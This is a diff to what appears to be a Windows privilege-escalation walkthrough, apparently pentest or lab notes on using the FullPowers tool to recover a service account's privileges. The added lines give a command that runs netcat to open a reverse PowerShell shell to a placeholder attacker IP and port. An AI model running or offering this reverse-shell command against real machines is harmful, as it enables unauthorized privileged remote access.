@@ -10,6 +10,10 @@
 
 2) Run the FullPowers tool to regain the privileges of the NT Authority Local Service account we are currently on
 
+        FullPowers.exe -c "C:\temp\nc64.exe ATTACK_IP PORT -e powershell" -z
+
+### OR
+
         FullPowers -x
 
 3) Check your privileges again
